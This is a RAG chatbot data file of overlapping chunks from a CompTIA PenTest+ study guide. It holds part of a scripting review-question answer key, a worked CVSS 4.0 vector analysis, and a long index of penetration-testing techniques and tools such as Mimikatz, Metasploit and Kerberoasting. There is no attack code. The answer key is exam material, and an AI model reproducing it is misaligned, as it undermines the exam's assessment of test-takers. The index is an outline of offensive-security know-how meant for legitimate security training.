rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	explicit conversion of numeric values to strings prior to concatenation. 12. D. There is no limit to the number of elif clauses that may be included in a Bash script. 13. B. When using conditional execution, only one clause is executed. In this case, the code following the if clause will execute, making it impossible for the elif or else clause to execute. 14. B. Use the flowchart in Figure 12.3 to answer this question. The code contains a Do statement, so it is written in PowerShell. 15. D. Use the flowchart in Figure 12.1 to answer this question. The code contains a fi statement, so it is written in Bash. 16. C. Use the flowchart in Figure 12.2 to answer this question. The code contains colons, so it is written in Python. 17. D. The nc command allows you to open a network port for listening and then direct the input received on that port to a file or an executable. 18. D. PowerShell, Python, and Ruby all support variants of the try..catch clause. Bash does not provide a built‐in error‐handling capability. 19. C. The %26 value is used to URL‐encode ampersands using the percent encoding scheme. 20. B. The ‐ge operator tests whether one value is greater than or equal to another value in Bash and PowerShell, whereas the ‐gt operator tests whether one value is strictly greater than the other. The >= and > operators are used in Python for the same purposes. Appendix B: Solution to Lab Exercise Solution to Activity 5.2: Analyzing a CVSS Vector The first vector is CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA: N. Breaking this down piece by piece gives us the following: AV:N indicates that an attacker may exploit the vulnerability remotely over a network. This is the most serious value for this metric. AC:L indicates that exploiting the vulnerability does not require any specialized conditions. This is the most serious value for this metric. AT:N indicates that the attack will likely succeed against any vulnerable system an attacker can reach. PR:N indicates that attackers do not need any authenticated privileges. This is the most serious value for this metric. UI:N indicates that no user interaction is necessary to exploit the vulnerability. VC:L and SC:L indicate that a successful exploitation of this vulnerability would yield partial access to information on both the vulnerable system and subsequent systems. This is the middle value for this metric. VI:N and SI:N indicate that a successful exploitation of this vulnerability would not allow the unauthorized modification of information on either the vulnerable or subsequent systems. This is the least serious value for this metric. VA:N and SI:N indicate that a successful exploitation of this vulnerability would have no availability impact on either the vulnerable or subsequent systems. This is the least serious value for this metric. Index A access, to accounts, 30–31 access control, broken, as a top security risk, 360 account access, 30–31 account takeover, 414–415 Actions on Objectives phase, of Cyber Kill Chain, 17 Active Directly Service (ADS),
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and SI:N indicate that a successful exploitation of this vulnerability would not allow the unauthorized modification of information on either the vulnerable or subsequent systems. This is the least serious value for this metric. VA:N and SI:N indicate that a successful exploitation of this vulnerability would have no availability impact on either the vulnerable or subsequent systems. This is the least serious value for this metric. Index A access, to accounts, 30–31 access control, broken, as a top security risk, 360 account access, 30–31 account takeover, 414–415 Actions on Objectives phase, of Cyber Kill Chain, 17 Active Directly Service (ADS), 398 Active Directory (AD), 398 active reconnaissance about, 61 banner grabbing, 79 cached pages, 64–65 Certificate Transparency (CT) logs, 70–71 cryptographic flaws, 65–66 DNS zone transfer (AXFR), 64 Hypertext Markup Language (HTML) scraping, 79–80 information disclosure, 71 network sniffing, 74–79 open source intelligence (OSINT), 61 password dumps, 66–69 search engine analysis and enumeration, 71–74 social media, 61–63 SSL, 63 TLS, 63 Transmission Control Protocol (TCP)/User Datagram Protocol (UDP) scanning, 70 active vulnerability scanning, 123 AD search, 505 Address Resolution Protocol (ARP) spoofing and poisoning, 261–262 administrative controls, 449–450 Advanced Penetration Testing: Hacking the World's Most Secured Networks (Allsopp), 201, 243 advanced persistent threats (APTs), 33–34 adversary‐in‐the‐middle (AiTM), 318, 398 agreement types, 37 Aircrack‐ng, 105, 288 alarms, 307 algorithm confusion attack, 346 Allsopp, Wil (author) Advanced Penetration Testing: Hacking the World's Most Secured Networks, 201, 243 Alteration, in DAD triad, 3 Amass, 100–101 Amazon Web Services (AWS), 92 amplification attacks, 288 analyzing code, 504 Android SDK tools, 424 antimalware, 75 antivirus (AV), 75 API keys, 93 APK Studio, 424 APKX, 424 appendix, in reports, 460 Apple Remote Desktop, 231 application programming interfaces (APIs) as an assessment type, 30, 39 unprotected, 358–359 application testing tools about, 361 dynamic application security testing (DAST), 362–367 static application security testing (SAST), 361–362 techniques for, 371 application vulnerabilities about, 331, 369 application testing tools, 361–369 authentication, 339–347 authorization, 347–352 exam essentials, 369–371 injection, 332–339 lab exercises, 371–372 real world scenario, 331 review questions, 373–377, 530–532 unsecure coding practices, 356–360 web, 352–356 applications as an assessment type, 39 unsupported, 169–170 arbitrary code execution, 351 arbitrary code execution vulnerabilities, 171–172 arrays, 477–480 artificial intelligence (AI) attacking, 424–426 in reports, 461–462 assessment types, 32, 38–39 asset inventory, 120 Atomic Red Team, 506 attack complexity (AC) metric, 157 Attack Narrative, in reports, 457–458 attack path mapping, 93 attack requirements (AT) metric, 157 attack vector (AV) metric, 156–157 attacks. See specific types attestation of findings, 464 authentication biometric, 453 broken, as a top security risk, 360 multifactor, 452–454 authentication attacks, 397–400 authentication vulnerabilities about, 339 password authentication, 340–341 session attacks, 341–345 authorization letters, 42 authorization vulnerabilities about, 347 directory traversal, 348–350 file inclusion attacks, 350–351 insecure direct object references, 347–348 privilege escalation, 352 automating penetration tests, 504–506 Availability, in CIA triad, 2–3 availability concerns, 427 availability metric, 159–160 B backdoor vulnerability, 357 backdoors, 240 baiting attacks, 311 banner grabbing, 79 bare‐metal virtualization, 180 base score, 161–162 Bash scripts, 474 batch files,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	metric, 157 attack vector (AV) metric, 156–157 attacks. See specific types attestation of findings, 464 authentication biometric, 453 broken, as a top security risk, 360 multifactor, 452–454 authentication attacks, 397–400 authentication vulnerabilities about, 339 password authentication, 340–341 session attacks, 341–345 authorization letters, 42 authorization vulnerabilities about, 347 directory traversal, 348–350 file inclusion attacks, 350–351 insecure direct object references, 347–348 privilege escalation, 352 automating penetration tests, 504–506 Availability, in CIA triad, 2–3 availability concerns, 427 availability metric, 159–160 B backdoor vulnerability, 357 backdoors, 240 baiting attacks, 311 banner grabbing, 79 bare‐metal virtualization, 180 base score, 161–162 Bash scripts, 474 batch files, 222 BGP looking glasses, 68 bind shell, 240, 436–437 biometric authentication, 453 black box tests, 33–34 blind SQL injection, 334 BloodHound, 217, 398–399 Bluejacking, 287, 428 Bluesnarfing, 287 Bluetooth attacks, 287 Bluetooth Low Energy (BLE) attacks, 287, 428 Bluetooth spamming, 428 Boolean blind SQL injection attacks, 335–336 Bourne‐again shell (Bash) about, 474 comparison operators in, 480 error handling, 501 flow control, 488–489 for loops, 492–493 string operators in, 482–483 variables, arrays and substitutions in, 478–479 while loops, 496–497 breach and attack simulation (BAS) tools, 505–506 bribery, 311 Bright Data, 62 Browser Exploitation Framework (BeEF), 75, 315–316, 322–323 brute‐force attacks, 280, 293, 322, 399, 403 Brutus, 234 budget, as a penetration testing consideration, 32 buffer overflow attacks, 170–171 buffer overflow vulnerabilities, 351 Burp Proxy, 363–364 Burp Suite, 422 business logic vulnerabilities, 422 C cached pages, 64–65 cachedump, 401 Cain and Abel, 233, 403 Caldera, 505 caller ID spoofing, 312, 316–317 CAN bus attack, 427 captive portal, 281 captive portals, attacking, 284 capturing handshakes, 282 cardholder data environments (CDEs), 7–9 Censys, 61, 71–73, 98–99 Certificate Authority (CA), 177 certificate enumeration, 65 certificate inspection, 65 certificate pinning, 31, 421 certificate services, 257 Certificate Transparency (CT) logs, 70–71 certificates, enumeration and inspection of, 65 CeWL, 404 change management, as a barrier to vulnerability scanning, 142 channel scanning, 283–284 ChatGPT, 425 chmod command, 474 CIA triad, 2–3 ciphers, insecure use of, 175–176 Clark, Ben (author) RTFM: Red Team Field Manual, 77 classes, 502 Classless Inter‐Domain Routing (CIDR) ranges, 38 cleartext communications, 428 clickjacking, 356 client acceptance, 463 cloned websites, 313 cloud access keys, 92–93 cloud assessments, 38–39 cloud asset discovery, 92 Cloud Custodian, 418 cloud malware injection attacks, 416 cloud service provider (CSP), 39–40, 93 cloud technologies about, 384–385, 412–413, 431–432 attacking, 412–419 exam essentials, 433–434 lab exercises, 434–437 review questions, 532–535 CloudBrute, 418 cloud‐native vendor tools, 418 cmd.exe, 219 CME, 398–399 code analyzing, 14, 135–136, 504 in CompTIA penetration testing process, 14 reusing, 502 role of in penetration testing, 503–506 signing, 359 testing, 135–136 understanding (See static code analysis) unsecure practices for, 356–360 code injection attacks, 337 command and control (C2) frameworks, 218 Command and Control phase, of Cyber Kill Chain, 17 command injection, 351 command injection attacks, 337–338 command‐line tools, 218–222 comma‐separated values (CSV) files, 500 Common Configuration Enumeration (CCE), 132 Common Platform Enumeration (CPE), 133 common use cases, 506 Common Vulnerabilities and Exposures (CVE), 80–81, 133 Common Vulnerability Scoring System (CVSS) about,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	vendor tools, 418 cmd.exe, 219 CME, 398–399 code analyzing, 14, 135–136, 504 in CompTIA penetration testing process, 14 reusing, 502 role of in penetration testing, 503–506 signing, 359 testing, 135–136 understanding (See static code analysis) unsecure practices for, 356–360 code injection attacks, 337 command and control (C2) frameworks, 218 Command and Control phase, of Cyber Kill Chain, 17 command injection, 351 command injection attacks, 337–338 command‐line tools, 218–222 comma‐separated values (CSV) files, 500 Common Configuration Enumeration (CCE), 132 Common Platform Enumeration (CPE), 133 common use cases, 506 Common Vulnerabilities and Exposures (CVE), 80–81, 133 Common Vulnerability Scoring System (CVSS) about, 133, 156 attack complexity (AC) metric, 157 attack requirements (AT) metric, 157 attack vector (AV) metric, 156–157 availability metric, 159–160 confidentiality metric, 158–159 integrity metric, 159 interpreting vectors, 160 privileges required (PR) metric, 157–158 summarizing scores, 160–162 user interaction (UI) metric, 158 Common Weakness Enumeration (CWE), 80–81, 395 communication. See reporting and communication comparison operators, 480 compliance‐based assessments, 32 components, vulnerable and outdated, as a top security risk, 360 CompTIA, penetration testing process, 11–14 Computer Misuse Act (CMA), 44 ComRAT, 396 conclusion, in reports, 459–460 Confidentiality, in CIA triad, 2–3 confidentiality agreements (CAs), 43 confidentiality metric, 158–159 configuration analysis of target systems, 506 configuration management systems, 165 container scans, 408–409 containerization attacks, 411–412 virtualization and, 129, 408 continuous monitoring, 139 contracts, 43 cookies, 343–345 Core Security Impacket Python libraries, 90 corporate policy, vulnerability scanning and, 119 Council of Registered Ethical Security Testers (CREST), 47 Covenant, 222 covert channels, 240–241 CrackMapExec (CME), 222, 225 creddump package, 401 credential acquisition, 400–401 credential attacks, 399–400 credential harvesting, 313, 414 credential stuffing, 400 credential testing, 403 credentialed scans, 130 credentials default, 256–257 enumeration and, 203–204 obtaining, 391–393 stored, 394 testing tools and attacks on, 397–404 cron jobs, 225–226 cross compiling, 236 cross‐platform exploits, 393–397 cross‐site request forgery (CSRF/XSRF), 355 cross‐site scripting (XSS) attack about, 184–185, 352 creating, 371–372 cryptographic flaws, 65–66, 360 crystal box tests, 33–34 customer commitments, as a barrier to vulnerability scanning, 141 customer responsibilities, 40–41 Cyber Kill Chain about, 14–15 phases of, 15–17 CyberArk, 412 cybersecurity goals, 2–3 D DAD triad, 3 daemons, 217, 239 Damage Potential, Reproducibility, Exploitability, Affected Users, Discoverability (DREAD), 49 dark web, 313–314 data attacking storage of, 430–431 ownership and retention of, 44 retention or destruction of, 464 data corruption attacks, 282 data exfiltration, 240–241 data leakage, 428 data manipulation, 503–504 data modification attacks, 282 database scanning, 368 database vulnerability scanning, 368 deauthentication attacks, 282 debug modes, 174 default account settings, 394 default credentials, 256–257 Delivery phase, of Cyber Kill Chain, 16 Denial, in DAD triad, 3 denial‐of‐service (DoS) attacks, 266–267, 416 dependency mapping, 362 deserialization attacks, 339 destruction, of data, 464 Detailed Findings, in reports, 456–457 Deviant Ollam, 305 dictionaries, 404 dictionary attacks, 235, 280, 399 dig, 98 digital certificates, issues with, 176–178 Digital Living Network Alliance (DLNA), 431 DirBuster tool, 350, 366, 404 direct object references, insecure, 347–348 directories, 404 directory attacks, 398–399 directory enumeration, 88–89 directory traversal, 348–350 direct‐to‐origin (D2O) attacks, cloud and, 416–417
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	368 database vulnerability scanning, 368 deauthentication attacks, 282 debug modes, 174 default account settings, 394 default credentials, 256–257 Delivery phase, of Cyber Kill Chain, 16 Denial, in DAD triad, 3 denial‐of‐service (DoS) attacks, 266–267, 416 dependency mapping, 362 deserialization attacks, 339 destruction, of data, 464 Detailed Findings, in reports, 456–457 Deviant Ollam, 305 dictionaries, 404 dictionary attacks, 235, 280, 399 dig, 98 digital certificates, issues with, 176–178 Digital Living Network Alliance (DLNA), 431 DirBuster tool, 350, 366, 404 direct object references, insecure, 347–348 directories, 404 directory attacks, 398–399 directory enumeration, 88–89 directory traversal, 348–350 direct‐to‐origin (D2O) attacks, cloud and, 416–417 Dirty COW, 171 Disclosure, in DAD triad, 3 discovery, 246 distribution, of reports, 462 DNS zone transfer (AXFR), 64 DNSDumpster, 99–100 Docker, 411–412 Docker Bench, 418 documentation, for penetration tests, 30 documented exceptions, 164 Domain Name System (DNS) amplification, 179 attacks, 229 cache poisoning, 259–260 enumeration, 88 spoofing, 259–260 vulnerabilities with, 179 Domain Object Model (DOM), 355 domains, 38 downloading files, 504 Drozer, 424 dynamic application security testing (DAST), 362–367 dynamic code analysis, 135 Dynamic Host Configuration Protocol (DHCP), 38 E EAPHammer, 285 eavesdropping, 76, 282, 284–288, 310, 343 echo command, 474 802.1Q trunking, 258 elicitation, 309 email addresses, 90–91 embedded systems, attacking, 426–430 emergency contact, 447 Empire, 504 endpoint vulnerabilities, 168–174 engagements ending, 462–464 Scoping and Planning domain, 25–39 entry control systems, bypassing, 305–306 enumeration about, 81, 202, 504 active reconnaissance and, 80–105 credentials, 203–204 forests, 203 groups, 203 manual, 94–95 network traffic discovery, 203 permission, 92 reconnaissance and, 60–80 secrets, 92–93 sensitive data, 204 share, 268 unencrypted files, 204–205 users, 89–90, 202 web application firewall, 93–94 web pages and, 94 environmental differences, 44–45 error handling about, 357, 501 Bash, 501 PowerShell, 501 Python, 502 escalation process, 36 ethical considerations, in reports, 460–461 ethical hacking, 5 Ettercap, 423 evasion, persistence and, 239–242 evil twin attack, 281, 284–288 Evilginx, 318 Evil‐winrm tool, 406 exam essentials application vulnerabilities, 369–371 cloud technologies, 433–434 exploits, 244–245 hosts, 433–434 Information Gathering and Vulnerability Scanning domain, 106 network vulnerabilities, 292 penetration testing, 18–19 physical and social vulnerabilities, 320–321 pivoting, 244–245 Planning and Scoping domain, 50–52 reporting and communication, 465–466 scripting, 507 specialized systems, 433–434 vulnerability scanning, 143, 186 exclusions, 36 executive summary, in reports, 455–456 expired tokens, 346 exploit chaining, 268 Exploit Database, 208 Exploit DB, 256 Exploitation phase, of Cyber Kill Chain, 16 exploits about, 197, 243–244, 245 attacks and, 198–199 in CompTIA penetration testing process, 13–14 covering your tracks, 242–243 exam essentials, 244–245 identifying, 205–207, 256 lab exercises, 245–247 leveraging, 233–239 network (See network vulnerabilities) persistence and evasion, 239–242 real world scenario, 197 resources for, 207–209 review questions, 248–251, 524–526 specifics for, 223–233 toolkits for, 209–222 explore.exe command, 220 Export Administration Regulations (EAR), 44 Extensible Configuration Checklist Description Format (XCCDF), 133 external penetration testing teams, 10 F facial recognition, 422 facilities, entering, 303–307 false positive error, 162 Family Educational Rights and Privacy Act (FERPA), 115 Federal Information Security Management Act (FISMA), 116–119 Fern, 289 file inclusion attacks, 350–351 File Transfer Protocol (FTP), 173,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	testing process, 13–14 covering your tracks, 242–243 exam essentials, 244–245 identifying, 205–207, 256 lab exercises, 245–247 leveraging, 233–239 network (See network vulnerabilities) persistence and evasion, 239–242 real world scenario, 197 resources for, 207–209 review questions, 248–251, 524–526 specifics for, 223–233 toolkits for, 209–222 explore.exe command, 220 Export Administration Regulations (EAR), 44 Extensible Configuration Checklist Description Format (XCCDF), 133 external penetration testing teams, 10 F facial recognition, 422 facilities, entering, 303–307 false positive error, 162 Family Educational Rights and Privacy Act (FERPA), 115 Federal Information Security Management Act (FISMA), 116–119 Fern, 289 file inclusion attacks, 350–351 File Transfer Protocol (FTP), 173, 220, 229, 276–277 fileless malware, 224–225 filename brute‐forcing, 404 files downloading, 504 unsecure, 393 findstr.exe, 222 FIPS 140‐3, 46 firewalls, 76 firmware vulnerabilities, 172, 175 flow control about, 486–487 Bash, 488–489 conditional execution, 487–499 language of conditional execution statements, 490 for loops, 490–494 PowerShell, 489 Python, 489–490 while loops, 494–499 folder permissions, unsecure, 393 follow‐up actions/retesting, 464 for loops about, 490–492 Bash, 492–493 identifying language of, 494 PowerShell, 493 Python, 493–494 forests, enumeration and, 203 fragile systems, 127–128 frequency, of vulnerability scanning, 121–123 Frida, 423 Friedl, Steve, 260 ftp.exe tool, 220 functions, 502 fuzz testing/fuzzing, 135–136, 364–365 G General Data Protection Regulation (GDPR), 45–46 GitHub, 222 goals, reprioritizing, 449 goals‐based assessments, 32 Gobuster, 366 Google Dorks, 73–74 Google Hacking Database (GHDB), 73 Gophish, 317 Gramm‐Leach‐Bliley Act (GLBA), 46 gray box tests, 33–34 Greenbone OpenVAS, 125 groups, 89–90, 203 H hacker mindset, adopting the, 4–5 hacking, ethical, 5 handshakes, capturing, 282 hard‐coded configurations, 428 hard‐coded credentials, 357–358 hardware flaws, 172 harvested credentials, 390–391 hash cracking, 280 Hashcat, 402, 435–436 hashes acquiring and using, 391 capturing, 292–293 Health Insurance Portability and Accountability Act (1996), 46, 115 HighOn.Coffee Penetration Testing Tools Cheat Sheet, 77 horizontal escalation attacks, 237 host discovery, 89 hosted virtualization, 180 hosting provider responsibilities, 39–40 hosts about, 384–385, 431–432 attacking, 385–397 credential attacks and testing tools, 397–404 exam essentials, 433–434 lab exercises, 434–437 real world scenario, 384–385 remote access, 404–407 review questions, 532–535 virtual machines and containers, 407–412 Hping, 77, 267 Hunter.io, 99 Hydra, 403 Hypertext Markup Language (HTML) scraping, 79–80 Hypertext Transfer Protocol (HTTP), 230 Hypertext Transfer Protocol Secure (HTTPS), 230 hypervisor, 180, 410–411 I identification and authentication failures, as a top security risk, 360 identity and access management (IAM), 40–41, 413 Impacket, 505 Impacket Python libraries, 90 impersonation attacks, 310–311 industrial control systems (ICSs), 182, 426–430 Inetd, 239 Infection Monkey, 506 information disclosure, 71, 419 information gathering, 503 Information Gathering and Vulnerability Scanning domain about, 60, 105–106 active reconnaissance and enumeration, 80–105 in CompTIA penetration testing process, 12–13 exam essentials, 106 lab exercises, 107–108 for physical facility penetration testing, 307 real world scenario, 60, 81, 85 reconnaissance and enumeration, 60–80 review questions, 109–112, 518–520 information leakage, 71 information release, 71 Information Supplement: Penetration Testing Guidance, 9 Information Systems Security Assessment Framework (ISSAF), 49 informational results, 164–165 infrastructure as code (IaC), 362 injection attacks about, 183–184 code, 337 command, 337–338 input validation, 332 Lightweight Directory Access Protocol (LDAP), 338
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Infection Monkey, 506 information disclosure, 71, 419 information gathering, 503 Information Gathering and Vulnerability Scanning domain about, 60, 105–106 active reconnaissance and enumeration, 80–105 in CompTIA penetration testing process, 12–13 exam essentials, 106 lab exercises, 107–108 for physical facility penetration testing, 307 real world scenario, 60, 81, 85 reconnaissance and enumeration, 60–80 review questions, 109–112, 518–520 information leakage, 71 information release, 71 Information Supplement: Penetration Testing Guidance, 9 Information Systems Security Assessment Framework (ISSAF), 49 informational results, 164–165 infrastructure as code (IaC), 362 injection attacks about, 183–184 code, 337 command, 337–338 input validation, 332 Lightweight Directory Access Protocol (LDAP), 338 parameter pollution, 333 SQL, 334–337 as a top security risk, 360 web application firewalls (WAFs), 333–334 in‐person social engineering, 309–311 input allowlisting, 332 input and output (I/O), 499–500 input blocklisting, 332 input validation, 332 insecure defaults, 428 insecure design flaws, as a top security risk, 360 inSSIDer, 104, 289 Installation phase, of Cyber Kill Chain, 16 Integrity, in CIA triad, 2–3 integrity metric, 159 Intelligent Platform Management Interface (IPMI), 430 Interactive Application Security Testing (IAST), 367–368 interception proxies, 137, 363–364 internal penetration testing teams, 9–10 Internet of Things (IoT) attacking, 426–430 protocols, 79 vulnerabilities with, 182–183 Internet Protocol (IP) addresses, 38 interrogation and interview tactics, 310 IP addresses, 179, 180, 506 IP ranges and addresses, 67–68 IT governance, as a barrier to vulnerability scanning, 142 IT service management (ITSM), 139 J jailbreak/rooting, 419 jamming, 282, 290 JetDirect, 230 John the Ripper, 234, 235, 402 JSON web tokens (JWTs), 346 K Kali Linux, 284, 401 Kaminsky, Dan, 260 KARMA Attacks Radio Machines Automatically (KARMA), 285 Kerberoasting, 277–278 Kerberos exploits, 346–347 kiosk escape, 395–396 Kismet, 289 known environment tests, 33–34 known vulnerable components, 421 Kube‐hunter, 418 Kubernetes, 411–412 Kumu, 90 L lab exercises application vulnerabilities, 371–372 cloud technologies, 434–437 exploits, 245–247 hosts, 434–437 Information Gathering and Vulnerability Scanning domain, 107–108 network vulnerabilities, 292–294 penetration testing, 19 physical and social vulnerabilities, 321–323 pivoting, 245–247 Planning and Scoping domain, 52 reporting and communication, 466 scripting, 508 specialized systems, 434–437 vulnerability scanning, 144–145, 187 large language models (LLMs), 425 lateral movement, pivoting and, 199–209 leaked keys, 231–232 legal concepts, 41–45 legal considerations, in reports, 460 lessons learned session, 463 leveraging exploits, 233–239 libraries, 502, 505 library injection, 396 license compliance, 362 lighting, for security, 307 Lightweight Directory Access Protocol (LDAP), 229, 338, 399 Line Printer Daemon (LPD), 230 Link Local Multicast Name Resolution (LLMNR), 271 Linux, 386–391 Linux kernel, 389–390 Linux Samba exploits, 279 living off the land, 224–225 load balancer detection, 75 local administrator credentials, 450–451 local file inclusion attacks, 350 location restrictions, 44–45 Lockheed Martin, 14–15 locks, bypassing, 305–306 The LockWiki, 305 log tampering, 396–397 logs, 165 LOLBin, 218, 406–407 ls command, 415 LSA secrets Registry, 392 lsadump, 401 M Maltego, 69, 96, 319 malware, fileless, 224–225 managed service provider (MSP), 39–40 management interface, vulnerabilities with, 181 mandatory reporting requirements, 42 manual enumeration, 94–95 mask attacks, 399–400 master service agreement (MSA), 37, 43 mdk4, 288 Media Access Control (MAC) spoofing, 262–263 Medusa, 403
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Linux, 386–391 Linux kernel, 389–390 Linux Samba exploits, 279 living off the land, 224–225 load balancer detection, 75 local administrator credentials, 450–451 local file inclusion attacks, 350 location restrictions, 44–45 Lockheed Martin, 14–15 locks, bypassing, 305–306 The LockWiki, 305 log tampering, 396–397 logs, 165 LOLBin, 218, 406–407 ls command, 415 LSA secrets Registry, 392 lsadump, 401 M Maltego, 69, 96, 319 malware, fileless, 224–225 managed service provider (MSP), 39–40 management interface, vulnerabilities with, 181 mandatory reporting requirements, 42 manual enumeration, 94–95 mask attacks, 399–400 master service agreement (MSA), 37, 43 mdk4, 288 Media Access Control (MAC) spoofing, 262–263 Medusa, 403 memorandum of understanding (MOU), 141 Metasploit, 90–91, 209–216, 239, 242, 405–406 Metasploitable, 199, 209, 279 Meterpreter, 215–216, 239, 242, 406 methodologies, 47–49, 456 Microsoft Management Console (MMC), 220 Mimikatz, 216–217, 234, 391, 400 misconfigured cloud assets, 415–416 misconfigured endpoints, 394 misconfigured services, 267–268 missing patch vulnerability, 168–169 mitigation strategies about, 449–450 local administrator credentials, 450–451 multifactor authentication, 452–454 open services, 454 password complexity, 451–452 plaintext passwords, 452 SQL injection, 454 Mitm6 tool, 229 MITRE ATT&CK Framework, 47–48, 395, 396 mobile assessments, 38 mobile device management (MDM), 168–169 mobile devices attacking, 419–424 security of, 168–169 MobSF, 423 model manipulation, 425–426 modifying IP addresses, 506 modules, 502, 504–505 motion sensors, 307 msbuild.exe tool, 220–221 multifactor authentication (MFA), 452–454 N National Institute of Standards and Technology (NIST), 48–49 National Vulnerability Database (NVD), 208 Ncat, 405 near‐field communication (NFC), 288 Needle, 423 Nessus, 125, 137, 138, 153 net commands, 219–220, 272–273 NetBIOS name resolution exploits, 269–273 Netcat, 240, 405 netstat utility, 221 Network Access Control (NAC) bypass, 264–265 Network Address Translation (NAT) protocol, 179 network assessments, 38 network scans, 128–130 network segmentation, 231 network sniffing, 74–79 network traffic discovery, enumeration and, 203 network vulnerabilities about, 255, 291–292 common services, 273–281 conducting exploits, 256–268 exam essentials, 292 exploiting Windows services, 269–273 identifying exploits, 256 lab exercises, 292–294 real world scenario, 255–256, 273–274 review questions, 295–298, 526–528 wireless exploits, 281–291 networks detecting defenses, 75–76 topology of, 74–75 vulnerabilities with, 174–180 New Technology LAN Manager (NTLM), 264 Nikto, 137 NIST Special Publication 800‐53, Security and Privacy Controls for Federal Information Systems and Organizations, 118–119 Nmap, 69–70, 74, 82–84, 508 Nmap Scripting Engine (NSE), 102 nmc.exe, 220 noncompete agreements, 43 nondisclosure agreements (NDAs), 37, 43 NSGenCS, 395 nslookup, 98 NT LAN Manager (NTLM), 391 O OAuth, 400 Objection, 423 objectives‐based assessments, 32 offline password cracking, 401–403 ongoing scanning, 139 on‐path attacks, 260–264, 282, 284–288, 343 on‐site assessment, 255–256 open services, reporting and communication, 454 open source intelligence (OSINT), 61 about, 80 Common Vulnerabilities and Exposures (CVE), 80–81 Common Weakness Enumeration (CWE), 80–81 Open Source Security Testing Methodology Manual (OSSTMM), 47 Open Vulnerability and Assessment Language (OVAL), 133 Open Web Application Security Project (OWASP), 48, 359–360, 361 OpenID Connect (OIDC) attacks, 400 The Open Organisation of Lockpickers (TOOOL), 305 OpenVAS, 137 operating system fingerprinting, 101 operating systems fingerprinting, 81–85 unsupported, 169–170 operational controls, 450 operational technology (OT) protocols, 79 Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE), 49 OSINT
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	139 on‐path attacks, 260–264, 282, 284–288, 343 on‐site assessment, 255–256 open services, reporting and communication, 454 open source intelligence (OSINT), 61 about, 80 Common Vulnerabilities and Exposures (CVE), 80–81 Common Weakness Enumeration (CWE), 80–81 Open Source Security Testing Methodology Manual (OSSTMM), 47 Open Vulnerability and Assessment Language (OVAL), 133 Open Web Application Security Project (OWASP), 48, 359–360, 361 OpenID Connect (OIDC) attacks, 400 The Open Organisation of Lockpickers (TOOOL), 305 OpenVAS, 137 operating system fingerprinting, 101 operating systems fingerprinting, 81–85 unsupported, 169–170 operational controls, 450 operational technology (OT) protocols, 79 Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE), 49 OSINT Framework, 104 over‐reach of permissions, 421 OWASP Mobile Application Security Verification Standard (MASVS), 48 OWASP Password Storage Cheat Sheet, 236 P packet capture, 76 packet crafting, 77–78, 281 packet inspection, 77–78 Packet Storm, 256 Pacu, 418 parameter pollution, 333 partial knowledge tests, 33–34 passcode vulnerabilities, 421 passive vulnerability scanning, 123 pass‐the‐hash attacks, 391 password attacks, 280 password dumps, 66–69 password spraying, 280, 400 passwords about, 93 authentication of, 340–341 complexity of, 451–452 cracking, 435–436 plaintext, 452 Patator, 403 patching fragmentation, 421 path, communication, 447–448 payload, in Metasploit, 214–215 payload obfuscation, 394–395 Payment Card Industry Data Security Standard (PCI DSS), 7–9, 24–25, 45– 46, 116, 172, 231 peer reviews, 461 penetration testers responsibilities of, 41 risk to, 42–43 penetration testing about, 2–5, 18 automating, 504–506 benefits of, 6 CompTIA process for, 11–14 designing physical, 321–322 exam essentials, 18–19 lab exercises, 19 physical facility, 302–303 reasons for, 5–9 regulatory requirements for, 7–9 remediation workflow and, 139 review questions, 516–518 scripting and, 473–476 support for, 119 support resources for, 29–32 tools for, 17 vulnerability scanning and, 144–145 who performs, 9–11 writing a report, 454–462 Penetration Testing Execution Standard (PTES), 25, 47–48 percent‐encoding, 481 perimeter defenses/barriers, bypassing, 306–307 permission, 27 permission enumeration, 92 persistence, evasion and, 239–242 phishing attacks, 301–302, 312 physical and social vulnerabilities about, 319–320 exam essentials, 320–321 lab exercises, 321–323 physical facility penetration testing, 302–303 real world scenarios, 301–302 review questions, 324–327, 528–530 social engineering, 308–319 physical controls, 450 piggybacking, 304–305 pivoting about, 199–201, 243–244, 246–247 covering your tracks, 242–243 exam essentials, 244–245 lab exercises, 245–247 lateral movement and, 199–209 review questions, 248–251, 524–526 plaintext passwords, 452 Planning and Scoping domain about, 24–25, 50 in CompTIA penetration testing process, 12 engagements, 25–39 exam essentials, 50–52 lab exercises, 52 legal concepts, 41–45 real world scenario, 24–25 regulatory compliance, 45–46 review questions, 53–56, 516–518 Shared Responsibility Model, 39–41 standards and methodologies, 47–49 threat modeling frameworks, 49–50 platform plug‐ins, 95 plug‐in feeds, vulnerability, 132 plug‐ins, configuring, 126–127 point‐of‐sale (POS) systems, 172 PortSwigger, 363–364 post‐engagement cleanup, 462–463 post‐exploit attacks, 233–236 Postman, 423 PowerShell (PS) about, 223, 475–476 comparison operators in, 480 error handling, 501 flow control, 489 for loops, 493 modules, 504–505 string operators in, 483–484 variables arrays and substitutions in, 479 while loops, 497–498 PowerShell ISE, 222 PowerSploit, 216–217, 505 PowerUpSQL, 505 PowerView, 505 presumption of compromise, 7 pretexting, 303, 311 primary contact, 447 privilege escalation attacks, 171, 236–237, 352, 414–415 privileges required (PR)
